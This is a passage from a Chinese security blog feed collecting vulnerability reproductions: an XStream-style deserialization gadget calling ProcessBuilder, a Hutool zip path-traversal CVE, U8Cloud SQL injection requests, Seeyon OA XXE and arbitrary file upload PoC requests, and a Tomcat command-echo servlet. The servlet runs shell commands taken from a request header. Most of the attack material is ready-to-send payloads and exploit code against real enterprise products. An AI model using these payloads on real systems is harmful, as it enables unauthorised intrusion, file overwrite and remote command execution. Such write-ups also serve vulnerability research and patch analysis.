class="language-xml">                 <span class="hljs-tag">&lt;/<span class="hljs-name">iter</span>&gt;</span></span><span class="language-xml">                 <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>&gt;</span></span><span class="language-xml">                   <span class="hljs-tag">&lt;<span class="hljs-name">method</span>&gt;</span></span><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span></span><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span></span><span class="language-xml">                   <span class="hljs-tag">&lt;/<span class="hljs-name">method</span>&gt;</span></span><span class="language-xml">                   <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><span class="language-xml">                 <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span></span><span class="language-xml">                 <span class="hljs-tag">&lt;<span class="hljs-name">next</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;string&quot;</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">next</span>&gt;</span></span><span class="language-xml">               <span class="hljs-tag">&lt;/<span class="hljs-name">serviceIterator</span>&gt;</span></span><span class="language-xml">               <span class="hljs-tag">&lt;<span class="hljs-name">lock</span>/&gt;</span></span><span class="language-xml">             <span class="hljs-tag">&lt;/<span class="hljs-name">cipher</span>&gt;</span></span><span class="language-xml">             <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span></span><span class="language-xml">             <span class="hljs-tag">&lt;<span class="hljs-name">ibuffer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ibuffer</span>&gt;</span></span><span class="language-xml">             <span class="hljs-tag">&lt;<span class="hljs-name">done</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">done</span>&gt;</span></span><span class="language-xml">             <span class="hljs-tag">&lt;<span class="hljs-name">ostart</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">ostart</span>&gt;</span></span><span class="language-xml">             <span class="hljs-tag">&lt;<span class="hljs-name">ofinish</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">ofinish</span>&gt;</span></span><span class="language-xml">             <span class="hljs-tag">&lt;<span class="hljs-name">closed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">closed</span>&gt;</span></span><span class="language-xml">           <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span></span><span class="language-xml">           <span class="hljs-tag">&lt;<span class="hljs-name">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">consumed</span>&gt;</span></span><span class="language-xml">         <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span></span><span class="language-xml">         <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span></span><span class="language-xml">       <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span></span><span class="language-xml">       <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span></span><span class="language-xml">     <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml">   <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><span class="language-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><span class="language-xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span></span><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span></span><span class="language-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><span class="language-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><span class="language-xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span></span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230308115106167.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230308115126477.png"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hutool任意文件覆盖漏洞-CVE-2018-17297</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/hutool-cve-2018-17297/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/hutool-cve-2018-17297/</url>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h1><p>Hutool是一款用于对文件、流、转码、正则、XML等JDK方法进行封装的Java基础类工具。</p><p>Hutool 4.1.12之前版本中的ZipUtil.java文件的‘unzip’函数存在安全漏洞。远程攻击者可借助ZIP归档文件中带有目录遍历序列的文件名利用该漏洞覆盖任意文件。</p><h1 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h1><p>Hutool &lt; 4.1.12</p><h1 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. 危害等级</h1><p>高危</p><h1 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. 复现过程</h1><p>在D:\tmp\test1\test2目录下创建passwd文件，写入CVE-2018-17297，再将该文件压缩成passwd.zip文件</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230203180735825.png"> </p><p>在D:\tmp目录下创建passwd空文件</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230203180903215.png"></p><p>运行java程序</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> cn.hutool.core.util.ZipUtil;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        ZipUtil.unzip(<span class="hljs-string">&quot;D:\\tmp\\1\\2\\passwd.zip&quot;</span>,<span class="hljs-string">&quot;D:\\tmp\\1\\2\\..\\..\\&quot;</span>);    &#125;&#125;</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230203181110449.png"></p><p>查看D:\tmp目录的passwd文件，被覆盖</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230203181137469.png"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>U8Cloud系列漏洞</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/U8Cloud%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/U8Cloud%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="RegisterServlet接口存在SQL注入漏洞"><a href="#RegisterServlet接口存在SQL注入漏洞" class="headerlink" title="RegisterServlet接口存在SQL注入漏洞"></a>RegisterServlet接口存在SQL注入漏洞</h1><p>依赖包</p><div class="code-wrapper"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\U8CERP\modules\uap\META-INF\lib\uapsystemframework.jar<span class="hljs-name">C</span>:\U8CERP\modules\uap\META-INF\lib\uapsfapp.jar<span class="hljs-name">C</span>:\U8CERP\external\lib\fw.jar</code></pre></div><p>C:\U8CERP\ierp\bin\prop.xml</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /servlet/RegisterServlet?key=caofalin_key&amp;usercode=caofalin_code&amp;charset=UTF-<span class="hljs-number">8</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.58.120.201:8088</span><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">99</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4844</span>.<span class="hljs-number">51</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">127.0.0.1</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span></code></pre></div><h1 id="ClientRequestDispatch反序列化漏洞"><a href="#ClientRequestDispatch反序列化漏洞" class="headerlink" title="ClientRequestDispatch反序列化漏洞"></a>ClientRequestDispatch反序列化漏洞</h1><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/servlet/~iufo/nc.ui.iufo.jiuqi.ClientRequestDispatch</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1403<span class="hljs-attribute">host</span><span class="hljs-punctuation">: </span>10.58.120.201:8088<span class="hljs-attribute">accept</span><span class="hljs-punctuation">: </span>*/*<span class="hljs-attribute">user-agent</span><span class="hljs-punctuation">: </span>AHC/2.1<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded</code></pre></div><h1 id="FileTransportServlet反序列化漏洞"><a href="#FileTransportServlet反序列化漏洞" class="headerlink" title="FileTransportServlet反序列化漏洞"></a>FileTransportServlet反序列化漏洞</h1>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>致远OA系列漏洞</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Seeyon%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Seeyon%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="金格控件XML外部实体注入漏洞"><a href="#金格控件XML外部实体注入漏洞" class="headerlink" title="金格控件XML外部实体注入漏洞"></a>金格控件XML外部实体注入漏洞</h1><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>补丁替换iSolutions_web_API-V3.1.0.268.jar包的com.kg.core.AKgSignature类，通过diff发现漏洞代码存在getNodes方法内</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231116143857642.png"></p><p>getNodes方法为私有方法，在该类中xmlToList调用了方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231116144321284.png"> </p><p>下一步需要找到谁调用了xmlToList方法</p><h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>由于金格为致远服务的第三方组件，其供了一整套API接口，先确定金格组件的servlet</p><div class="code-wrapper"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.kg</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.servlet</span>.ActionServlet</code></pre></div><p>查看该类在致远web.xml配置中的servlet名称为ActionServlet，匹配的路由模式为&#x2F;m-signature&#x2F;*</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231116151743856.png"></p><p>在ActionServlet中，doGet&#x2F;doPost方法将请求交给process方法处理，process方法调用_process方法预处理</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231116152340967.png"></p><p>查看_process方法，从请求的uri中获取请求的action名和方法名</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231116152656965.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231116153029627.png"></p><p>再通过反射调用请求action的方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231116152910172.png"> </p><p>所以得知我们需要找到调用xmlToList方法中与Action相关的类，经测试RunSignatureAction类满足要求，下一步就是发送请求测试需要哪些参数让代码能够成功执行到xmlToList方法，经测试需要imgvalue和xmlValue参数</p><p>此时完整的http请求如下</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/seeyon/m-signature/RunSignature/run</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>222<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=ISO-8859-1<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.58.120.201<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Apache-HttpClient/4.5.14 (Java/1.8.0_65)<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-apache"><span class="hljs-attribute">imgvalue</span>=ABCDEFGHIJKLMNOPQRSTUVWXYzabcdefghijklmnopqrstuvwxyZ0123456789+/=&amp;xmlValue=%<span class="hljs-number">3</span>C%<span class="hljs-number">21</span>DOCTYPE+ANY+%<span class="hljs-number">5</span>B%<span class="hljs-number">3</span>C%<span class="hljs-number">21</span>ENTITY+name+SYSTEM+%<span class="hljs-number">22</span>http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A9999%<span class="hljs-number">2</span>Fsuccess_xxe%<span class="hljs-number">22</span>+%<span class="hljs-number">3</span>E%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Cname%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>name%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fname%<span class="hljs-number">3</span>E</span></code></pre></div><p>经测试发送该请求响应404，大致是该接口需要鉴权</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231117112906927.png"></p><p>尝试加上用户权限的cookie后发送，成功200响应</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231117112637906.png"></p><h2 id="是否可以未授权访问"><a href="#是否可以未授权访问" class="headerlink" title="是否可以未授权访问"></a>是否可以未授权访问</h2><p>查看web.xml文件，寻找一个可以未授权访问的接口，经测试发现&#x2F;getAjaxDataServlet接口满足要求</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231117114352266.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231117114428667.png"></p><p>构造请求发送，未触发漏洞</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231117114558446.png"> </p><p>推测&#x2F;getAjaxDataServlet需要提供请求参数，经调试可得?S&#x3D;ajaxEdocSummaryManager&amp;M&#x3D;deleteUpdateObj参数</p><p>最终的poc如下</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/seeyon/m-signature/RunSignature/run/getAjaxDataServlet?S=ajaxEdocSummaryManager&amp;M=deleteUpdateObj</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>222<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=ISO-8859-1<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.58.120.201<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Apache-HttpClient/4.5.14 (Java/1.8.0_65)<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-apache"><span class="hljs-attribute">imgvalue</span>=ABCDEFGHIJKLMNOPQRSTUVWXYzabcdefghijklmnopqrstuvwxyZ0123456789+/=&amp;xmlValue=%<span class="hljs-number">3</span>C%<span class="hljs-number">21</span>DOCTYPE+ANY+%<span class="hljs-number">5</span>B%<span class="hljs-number">3</span>C%<span class="hljs-number">21</span>ENTITY+name+SYSTEM+%<span class="hljs-number">22</span>http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A9999%<span class="hljs-number">2</span>Fsuccess_xxe%<span class="hljs-number">22</span>+%<span class="hljs-number">3</span>E%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Cname%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>name%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fname%<span class="hljs-number">3</span>E</span></code></pre></div><h1 id="致远OA-WPS任意文件上传-读取漏洞"><a href="#致远OA-WPS任意文件上传-读取漏洞" class="headerlink" title="致远OA WPS任意文件上传&amp;读取漏洞"></a>致远OA WPS任意文件上传&amp;读取漏洞</h1><p>web路由是通配符，需要了解其如何调用servlet</p><p>一般通过服务的通用servlet去反射调用具体的action 或者 servlet</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/seeyon/wpsAssistServlet?flag=save&amp;fileId=1&amp;realFileType=../../../../ApacheJetspeed/webapps/ROOT/success.txt</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>181<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryAD5kvp4fACenrs2H<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.58.120.201<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Apache-HttpClient/4.5.14 (Java/1.8.0_65)<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryAD5kvp4fACenrs2H</span></span><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;payload&quot;; filename=&quot;1.txt&quot;</span><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><span class="language-pgsql"></span><span class="language-pgsql">pwn</span><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryAD5kvp4fACenrs2H</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/pwn.jsp</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.58.120.201<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat反序列化回显</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Tomcat%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Tomcat%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="基于全局变量的方式获取Request对象获取Response对象"><a href="#基于全局变量的方式获取Request对象获取Response对象" class="headerlink" title="基于全局变量的方式获取Request对象获取Response对象"></a>基于全局变量的方式获取Request对象获取Response对象</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>java-object-searcher</strong></p><p>项目地址：<a href="https://github.com/c0ny1/java-object-searcher">https://github.com/c0ny1/java-object-searcher</a></p><p>该项目用于根据指定的关键字在内存中搜索指定的java对象</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Tomcat测试版本：v8.5.50、JDK1.8.0_50</p><p>创建Web项目</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204172716241.png"> </p><h3 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><h3 id="创建Servlet"><a href="#创建Servlet" class="headerlink" title="创建Servlet"></a>创建Servlet</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pacemrc.javasec.rcecho;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EchoServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;        response.getWriter().print(<span class="hljs-string">&quot;ok&quot;</span>);        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">Object</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> Util.getNeededRequestObject();            <span class="hljs-type">Object</span> <span class="hljs-variable">resp</span> <span class="hljs-operator">=</span> req.getClass().getMethod(<span class="hljs-string">&quot;getResponse&quot;</span>).invoke(req);            <span class="hljs-type">String</span> <span class="hljs-variable">header</span> <span class="hljs-operator">=</span> (String) req.getClass().getMethod(<span class="hljs-string">&quot;getHeader&quot;</span>, String.class).invoke(req, <span class="hljs-string">&quot;X-Token&quot;</span>);            <span class="hljs-keyword">if</span> (header != <span class="hljs-literal">null</span> &amp;&amp; !header.isEmpty()) &#123;                String[] cmd = <span class="hljs-literal">null</span>;                <span class="hljs-type">String</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();                <span class="hljs-keyword">if</span> (os.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;                    cmd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, header&#125;;                &#125; <span class="hljs-keyword">else</span> &#123;                    cmd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, header&#125;;                &#125;                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();                <span class="hljs-comment">// doWrite</span>                resp.getClass().getMethod(<span class="hljs-string">&quot;setStatus&quot;</span>, Integer.TYPE).invoke(resp, <span class="hljs-number">200</span>);                <span class="hljs-keyword">try</span> &#123;                    resp.getClass().getDeclaredMethod(<span class="hljs-string">&quot;doWrite&quot;</span>, java.nio.ByteBuffer.class).invoke(resp, java.nio.ByteBuffer.wrap(result.getBytes()));                &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;                    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.buf.ByteChunk&quot;</span>);                    <span class="hljs-type">Object</span> <span class="hljs-variable">byteChunk</span> <span class="hljs-operator">=</span> clazz.newInstance();                    clazz.getDeclaredMethod(<span class="hljs-string">&quot;setBytes&quot;</span>, <span class="hljs-type">byte</span>[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), <span class="hljs-number">0</span>, result.getBytes().length);                    resp.getClass().getMethod(<span class="hljs-string">&quot;doWrite&quot;</span>, clazz).invoke(resp, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;byteChunk&#125;);                &#125;            &#125;        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;    &#125;&#125;</code></pre></div><h3 id="创建工具类"><a href="#创建工具类" class="headerlink" title="创建工具类"></a>创建工具类</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pacemrc.javasec.rcecho;<span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;<span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;<span class="hljs-keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Util</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);        <span class="hljs-keyword">return</span> field.get(obj);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">try</span> &#123;            field = clazz.getDeclaredField(fieldName);            field.setAccessible(<span 